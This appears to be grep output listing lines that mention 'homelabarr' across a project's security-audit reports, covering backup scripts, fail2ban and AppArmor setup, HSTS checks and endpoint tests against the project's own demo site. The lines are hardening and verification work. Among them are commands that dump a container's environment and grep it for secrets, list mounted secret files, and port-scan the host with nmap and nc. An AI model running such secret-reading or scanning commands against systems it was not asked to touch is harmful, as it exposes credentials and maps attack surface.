| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 685 | `docker exec homelabarr-backend node -e "` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 687 | `  db.backup('/tmp/homelabarr.$STAMP.db').then(() => process.exit(0));` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 689 | `docker cp "homelabarr-backend:/tmp/homelabarr.$STAMP.db" "$BACKUP_DIR/"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 690 | `docker exec homelabarr-backend rm -f "/tmp/homelabarr.$STAMP.db"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 696 | `echo "wrote $BACKUP_DIR/homelabarr.$STAMP.db and $BACKUP_DIR/secrets.$STAMP.tar.zst"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 761 | `  https://ce-demo.homelabarr.com/api/audit/note \|\| true` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 802 | `docker inspect homelabarr-backend --format '{{ range .Config.Env }}{{ println . }}{{ end }}' \` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 806 | `docker exec homelabarr-backend ls -la /run/secrets/` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 810 | `docker exec homelabarr-backend sh -c 'tr "\0" "\n" < /proc/1/environ \| grep -iE "secret\|password\|key"'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 817 | `docker exec homelabarr-backend sh -c 'head -c 16 /app/data/homelabarr.db \| xxd'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 820 | `docker exec homelabarr-backend sh -c 'sqlite3 /app/data/homelabarr.db "SELECT 1;"' 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 824 | `curl -s -o /dev/null -w '%{http_code}\n' https://ce-demo.homelabarr.com/api/health` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 828 | `  https://ce-demo.homelabarr.com/api/audit \| jq '.chain.ok'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 839 | `  https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 847 | `  https://ce-demo.homelabarr.com/api/auth/sessions \| jq 'length'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 854 | `BEFORE=$(docker exec homelabarr-backend node -e "console.log(require('./server/db.js').db.prepare('SELECT count(*) c FRO` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 856 | `AFTER=$(docker exec homelabarr-backend node -e "console.log(require('./server/db.js').db.prepare('SELECT count(*) c FROM` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 877 | `curl -s https://ce-demo.homelabarr.com/api/health \| jq 'keys'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 879 | `curl -s -o /dev/null -w '%{http_code}\n' https://ce-demo.homelabarr.com/api/health/detail` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 883 | `grep -E 'DEFAULT_ADMIN_PASSWORD=\$\{DEFAULT_ADMIN_PASSWORD:\?' homelabarr.yml \| wc -l` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 887 | `grep -cE 'ghcr.io/imogenlabs/homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 925 | `\| **R9** \| Application-layer DAST — automated OWASP ZAP baseline run against ce-demo.homelabarr.com on each merge to` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 946 | `7. **Decide 'AUDIT_STRICT'** for production. Recommendation: 'AUDIT_STRICT=1' so any tampering with 'homelabarr.db' trig` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 989 | `         pulls any cleartext credential JSON from homelabarr-config volume` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1029 | `- 'docker exec homelabarr-backend ls /run/secrets' shows 4–5 mode-0400 files.` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1030 | `- 'head -c 16 /app/data/homelabarr.db' returns random bytes, not "SQLite format 3".` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1035 | `- 'homelabarr.yml' shows two 'tag@sha256:digest' pins (R5.5-drift-6 cleaned).` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-7-secrets@9e3e1a52' (live: ce-demo.homelabarr.com)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 25 | `\| 'scripts/migrate-config-to-db.js' (H-R7-6) \| source \| **FAIL — defer to R8.5-drift-3** (kv_secrets migration not ` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 87 | `# R5.5-drift-6 — homelabarr.yml after tagging v2.3.0 and running scripts/bump-image-digests.sh v2.3.0` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 88 | `image: ghcr.io/imogenlabs/homelabarr-frontend:v2.3.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 89 | `image: ghcr.io/imogenlabs/homelabarr-backend:v2.3.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 125 | `GET https://ce-demo.homelabarr.com → 200, HTTP/2, server: nginx (Traefik proxy in front)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 128 | `Inferred topology: Cloudflare or LE-signed certs at Traefik → routes '/' and '/api/' to the internal 'homelabarr-front` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 192 | `PROJECT_DIR="${PROJECT_DIR:-/opt/homelabarr}"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 193 | `BACKUP_LOCAL="${BACKUP_LOCAL:-/var/backups/homelabarr}"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 202 | `bash scripts/backup.sh                 # writes ./backups/homelabarr.<STAMP>.db and ./backups/secrets.<STAMP>.tar.zst` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 206 | `  rsync -av --remove-source-files "./backups/homelabarr.$STAMP.db" "$BACKUP_REMOTE/"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 219 | `  http://localhost/containers/homelabarr-backend/exec -d '{"AttachStdout":true,"Cmd":["node","-e","import(\'./server/aud` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 231 | `LATEST_DB="$(ls -1t /var/backups/homelabarr/homelabarr.*.db 2>/dev/null \| head -1)"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 232 | `LATEST_SECRETS="$(ls -1t /var/backups/homelabarr/secrets.*.tar.zst 2>/dev/null \| head -1)"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 253 | `**'/etc/cron.d/homelabarr-backup'** (installed by the runbook)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 256 | `17 3 * * *  root  /opt/homelabarr/scripts/backup-cron.sh    >> /var/log/homelabarr-backup.log 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 257 | `17 4 1 * *  root  /opt/homelabarr/scripts/restore-drill.sh  >> /var/log/homelabarr-restore-drill.log 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 263 | `ls -la /var/backups/homelabarr/*.db \| head -3` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 267 | `rclone ls "$BACKUP_REMOTE/" \| grep homelabarr \| head -3   # or rsync --list-only ...` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 271 | `sudo bash /opt/homelabarr/scripts/restore-drill.sh` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 276 | `  https://ce-demo.homelabarr.com/api/audit?limit=50 \` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 289 | `**RIGHT — '/etc/fail2ban/filter.d/homelabarr.conf'** (parses the JSONL audit log)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 296 | `'/etc/fail2ban/jail.d/homelabarr.conf'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 298 | `[homelabarr]` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 300 | `filter   = homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 302 | `logpath  = /var/lib/docker/volumes/homelabarr-activity/_data/audit-*.jsonl` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 303 | `          /var/lib/docker/volumes/homelabarr-activity/_data/audit.jsonl` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 319 | `fail2ban-regex /var/lib/docker/volumes/homelabarr-activity/_data/audit.jsonl /etc/fail2ban/filter.d/homelabarr.conf` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 323 | `fail2ban-client status homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 324 | `# Expect: 'Jail: homelabarr' followed by a Banned IP list (empty initially)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 330 | `    https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 333 | `fail2ban-client status homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 389 | `nc -vz -w 3 <homelabarr-host> 2375 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 390 | `nc -vz -w 3 <homelabarr-host> 2376 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 394 | `nmap -sS -p 1-1024 -Pn <homelabarr-host>` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 402 | `**Where:** 'homelabarr.yml' backend service 'security_opt:' block — currently has 'no-new-privileges' and 'seccomp=def` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 412 | `cat >/etc/apparmor.d/homelabarr-backend <<'EOF'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 415 | `profile homelabarr-backend flags=(attach_disconnected,mediate_deleted) {` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 449 | `apparmor_parser -r /etc/apparmor.d/homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 450 | `aa-status \| grep homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 453 | `**'homelabarr.yml' change** (backend service):` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 459 | `    - apparmor=homelabarr-backend         # new` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 466 | `aa-status \| grep homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 467 | `# Expect: 'homelabarr-backend (enforce)'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 469 | `docker exec homelabarr-backend sh -c 'touch /etc/foo 2>&1; echo rc=$?'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 472 | `docker inspect homelabarr-backend --format '{{ .HostConfig.SecurityOpt }}'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 473 | `# Expect: contains 'apparmor=homelabarr-backend'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 488 | `is the homelabarr-internal Docker network. No mTLS required.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 531 | `   from 'homelabarr.yml')` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 535 | `    cd /opt && git clone https://github.com/imogenlabs/homelabarr-ce && cd homelabarr-ce` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 544 | `      --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 546 | `      ghcr.io/imogenlabs/homelabarr-backend:v2.3.0` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 554 | `    # Restore the encrypted DB into the homelabarr-data volume` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 555 | `    docker run --rm -v homelabarr-data:/data alpine sh -c '` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 556 | `      rm -f /data/homelabarr.db` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 558 | `    docker cp <path-to-homelabarr.STAMP.db> homelabarr-backend:/app/data/homelabarr.db` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 593 | `**What:** Current live response: 'strict-transport-security: max-age=15552000; includeSubDomains'. Add 'preload', then s` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 604 | `curl -sI https://ce-demo.homelabarr.com/ \| tr -d '\r' \| grep -i '^strict-transport-security:'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 634 | `curl -sI https://ce-demo.homelabarr.com/ \| tr -d '\r' \| grep -i '^server:'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 650 | `Email <reporting@homelabarr.com> (preferred) or open a GitHub Security` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 651 | `Advisory: https://github.com/imogenlabs/homelabarr-ce/security/advisories/new` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 654 | `PGP key:             https://homelabarr.com/.well-known/pgp-key.asc` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 667 | `- Limits testing to ce-demo.homelabarr.com (or your own self-hosted copy).` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 692 | `      - homelabarr-activity:/audit:ro                        # the JSONL mirror from R6` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 694 | `      - homelabarr-internal` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 715 | `   'cosign verify --certificate-identity-regexp ... ghcr.io/imogenlabs/homelabarr-backend:v2.3.0'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 717 | `6. Encrypt the database on the FIRST upgrade to v2.3.0:  'docker compose exec backend bash scripts/encrypt-db.sh /app/da` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 721 | `10. fail2ban:  copy 'docs/fail2ban/homelabarr.conf' to '/etc/fail2ban/jail.d/', restart fail2ban.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 722 | `11. Backups:  install '/etc/cron.d/homelabarr-backup'; verify after 24 hours.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 749 | `encrypt-db:  ; docker compose exec backend bash scripts/encrypt-db.sh /app/data/homelabarr.db /run/secrets/sqlcipher_key` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 777 | `docker exec homelabarr-backend node -e "` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 798 | `ls -1t /var/backups/homelabarr/*.db \| head -1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 802 | `sudo bash /opt/homelabarr/scripts/restore-drill.sh` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 809 | `fail2ban-client status homelabarr \| grep 'Total banned'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 818 | `nmap -sS -p 1-1024 -Pn <homelabarr-host>` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 825 | `aa-status \| grep homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 826 | `# Expect: 'homelabarr-backend (enforce)'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 828 | `docker exec homelabarr-backend sh -c 'touch /etc/x 2>&1'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 835 | `curl -sI https://ce-demo.homelabarr.com/ \| tr -d '\r' \| grep -i strict-transport-security` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 842 | `curl -sI https://ce-demo.homelabarr.com/ \| tr -d '\r' \| grep -i ^server:` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 850 | `git clone https://github.com/imogenlabs/homelabarr-ce && cd homelabarr-ce && git checkout v2.3.0` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 868 | `docker exec homelabarr-backend node -e "` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 876 | `curl -s https://ce-demo.homelabarr.com/api/health \| jq 'keys'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 879 | `curl -s -o /dev/null -w '%{http_code}\n' https://ce-demo.homelabarr.com/api/health/detail` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 887 | `grep -cE 'ghcr.io/imogenlabs/homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 901 | `\| **R9** \| Application-layer DAST — automated OWASP ZAP baseline against ce-demo.homelabarr.com on each merge to mai` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 912 | `1. **Run 'scripts/host-firewall-setup.sh' on the ce-demo.homelabarr.com host.** This is irreversible without console acc` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 916 | `3. **Generate and publish the disclosure PGP key.** 'gpg --quick-gen-key reporting@homelabarr.com ed25519'. Publish the ` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 918 | `4. **Submit 'homelabarr.com' to https://hstspreload.org** AFTER M-R8-7 ships and you've confirmed every subdomain you pu` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 949 | `H-R8-2   /etc/fail2ban/filter.d/homelabarr.conf + jail config parses the` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 957 | `H-R8-4   /etc/apparmor.d/homelabarr-backend confines the backend` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 958 | `         container; homelabarr.yml gains apparmor=homelabarr-backend in` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1009 | `- 'fail2ban-client status homelabarr' shows the jail loaded.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1011 | `- 'aa-status' shows 'homelabarr-backend (enforce)'.` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-9-dast-zap@115cf4b97c' + live 'ce-demo.homelabarr.com'` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 54 | `\| CF-C-2 \| homelabarr.yml 'security_opt: apparmor=homelabarr-backend' \| 'security_opt' block exists, 'no-new-privileg` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 101 | `      ZAP_TARGET: ${{ inputs.target \|\| 'https://ce-demo.homelabarr.com' }}` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 277 | `+aa-enforce /etc/apparmor.d/homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 278 | `+aa-enforce /etc/apparmor.d/homelabarr-frontend 2>/dev/null \|\| true` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 282 | `+if ! aa-status \| grep -E 'homelabarr-(backend\|frontend)' \| grep -q 'enforce'; then` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 286 | `+echo 'AppArmor: homelabarr profiles in enforce mode'` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 289 | `### H-R9.5-6 — homelabarr.yml security_opt block missing 'apparmor=' line` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 303 | `--- a/homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 304 | `+++ b/homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 308 | `+      - apparmor=homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 313 | `+      - apparmor=homelabarr-frontend` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 354 | `**Owner verification step:** run 'curl -sI https://ce-demo.homelabarr.com/ \| grep -i strict-transport'. If the value st` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 432 | `These were R8 H-R8-5 deliverables. R9 didn't ship them. The spec is in 'homelabarr-ce-security-audit-round-8.md' (alread` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 454 | `+pgp_key_url:  https://github.com/smashingtags.gpg` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 469 | `test "$(curl -fsS -o /dev/null -w '%{http_code}' https://ce-demo.homelabarr.com/api/health/detail)" = 401` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 472 | `test "$(curl -fsS -o /dev/null -w '%{http_code}' https://ce-demo.homelabarr.com/api/_routes)" = 401` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 475 | `test "$(curl -fsS -o /dev/null -w '%{http_code}' -X POST https://ce-demo.homelabarr.com/api/internal/audit \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 479 | `test "$(curl -fsS -o /dev/null -w '%{http_code}' -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 487 | `R=$(curl -fsS -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 497 | `test "$(curl -fsS -o /dev/null -w '%{http_code}' -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 505 | `JWT=$(curl -fsS -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 509 | `M=$(curl -fsS -H "Authorization: Bearer $JWT" https://ce-demo.homelabarr.com/api/_routes)` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 520 | `curl -fsS -X POST https://ce-demo.homelabarr.com/api/internal/audit \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 534 | `sudo aa-status \| grep -E 'homelabarr-(backend\|frontend)' \| grep -q 'enforce' && echo OK_aa` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 537 | `docker inspect homelabarr-backend --format '{{json .HostConfig.SecurityOpt}}'` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 538 | `# Expect: ["apparmor=homelabarr-backend","no-new-privileges:true"]` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 544 | `HSTS=$(curl -sI https://ce-demo.homelabarr.com/ \| grep -i '^strict-transport-security:' \| tr -d '\r')` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 629 | `  - homelabarr.yml: apparmor= line for backend + frontend` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 635 | `now 2 rounds stale — content in homelabarr-ce-security-audit-round-8.md).` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 660 | `*Generated 2026-05-22T20:04:08.994Z — source: byte-level scan of 'security/round-9-dast-zap@115cf4b97c' via GitHub API` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-9-5-dast-completion@622ab6f700' + live 'ce-demo.homelabarr.co` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 15 | `- homelabarr.yml: 'apparmor=homelabarr-backend' line in security_opt ✓` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 38 | `GET https://ce-demo.homelabarr.com/api/health/detail` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 73 | `test "$(curl -fsS -o /dev/null -w '%{http_code}' https://ce-demo.homelabarr.com/api/health/detail)" = 401 \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 85 | `**Why blocks R10:** R10 includes a "backup tamper detection" scenario. We can't test detection of tampered backups when ` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 100 | `LOCAL_DIR="${LOCAL_DIR:-/var/backups/homelabarr}"` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 103 | `OUT="${LOCAL_DIR}/homelabarr-${TS}.tar"` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 108 | `  -C /app/data homelabarr.db audit.db 2>/dev/null \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 127 | `find "$LOCAL_DIR" -name 'homelabarr-*.gpg' -mtime +14 -delete` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 187 | `curl -fsS https://ce-demo.homelabarr.com/.well-known/security.txt \| grep -q '^Contact:'` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 225 | `  https://ce-demo.homelabarr.com/api/audit?limit=100 \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 281 | `*Generated 2026-05-22T20:36:56.379Z — source: byte-level scan of 'security/round-9-5-dast-completion@622ab6f700' + liv` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ commit on 'security/round-8-deployment-runbook' (06cafcc8bf) + live 'ce-demo.` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 19 | `\| H-R8-2 \| fail2ban filter + jail \| 'docs/fail2ban/homelabarr-filter.conf' (129B) + 'homelabarr-jail.conf' (268B). Pa` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 51 | `-OUT="/var/backups/homelabarr/${TS}.tar.gz"` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 53 | `-tar -C /app/data -czf "$OUT" homelabarr.db` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 58 | `+LOCAL_DIR="${LOCAL_DIR:-/var/backups/homelabarr}"` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 61 | `+OUT="${LOCAL_DIR}/homelabarr-${TS}.tar"` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 66 | `+  -C /app/data homelabarr.db audit.db \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 85 | `+find "$LOCAL_DIR" -name 'homelabarr-*.gpg' -mtime +14 -delete` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 141 | `+aa-enforce /etc/apparmor.d/homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 142 | `+aa-enforce /etc/apparmor.d/homelabarr-frontend 2>/dev/null \|\| true` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 145 | `+aa-status \| grep -E 'homelabarr-(backend\|frontend)' \| grep -q 'enforce' \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 147 | `+echo 'AppArmor: homelabarr profiles in enforce mode'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 153 | `--- a/homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 154 | `+++ b/homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 158 | `+      - apparmor=homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 224 | `Net-new files. Spec stays as written in R8 §3 H-R8-5 (Topology A vs B + mTLS chain) — agent should reference homelaba` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 237 | `+pgp_key_url:  https://github.com/smashingtags.gpg` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 239 | `+canary:       https://ce-demo.homelabarr.com/.well-known/security.txt` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 246 | `Contact: https://github.com/imogenlabs/homelabarr-ce/security/advisories/new` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 249 | `Canonical: https://ce-demo.homelabarr.com/.well-known/security.txt` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 250 | `Policy: https://github.com/imogenlabs/homelabarr-ce/blob/main/SECURITY.md` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 257 | `Round 9 builds the **outside-in attack surface verifier**: an automated DAST pipeline that runs in CI on every PR + on a` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 291 | `- Live 'ce-demo.homelabarr.com' has CF in front + Traefik + 5 containers. HSTS preload confirmed. Bundle 'index-BfJq5FsW` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 338 | `      - 'homelabarr.yml'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 368 | `          TARGET='${{ inputs.target \|\| vars.DAST_TARGET \|\| 'https://ce-demo.homelabarr.com' }}'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 430 | `      ZAP_TARGET: ${{ inputs.target \|\| 'https://ce-demo.homelabarr.com' }}` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 573 | `    - name: homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 574 | `      urls: ['https://ce-demo.homelabarr.com']` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 575 | `      includePaths: ['https://ce-demo.homelabarr.com/.*']` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 577 | `        - 'https://ce-demo.homelabarr.com/api/auth/forgot-password.*'  # don't spam the email queue` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 578 | `        - 'https://ce-demo.homelabarr.com/api/auth/reset-password.*'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 675 | `#     repos/smashingtags/homelabarr-ce/branches/main/protection \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 797 | `After the agent ships R9, run these on a clean checkout + against 'ce-demo.homelabarr.com'. Each one is shell-executable` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 837 | `curl -fsS -o /dev/null -w '%{http_code}' -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
